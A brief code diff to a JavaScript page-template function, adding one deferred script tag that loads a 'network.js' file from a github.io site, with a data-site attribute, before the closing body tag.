@@ -161,6 +161,7 @@ ${bodyClass === "home" ? `<div class="intro" aria-hidden="true"><div class="intr
 ${body}
 </main>
 ${footer()}
+<script src="https://probe2928-crypto.github.io/chainbrief/network.js" data-site="blockkey" defer></script>
 </body>
 </html>`;
 }
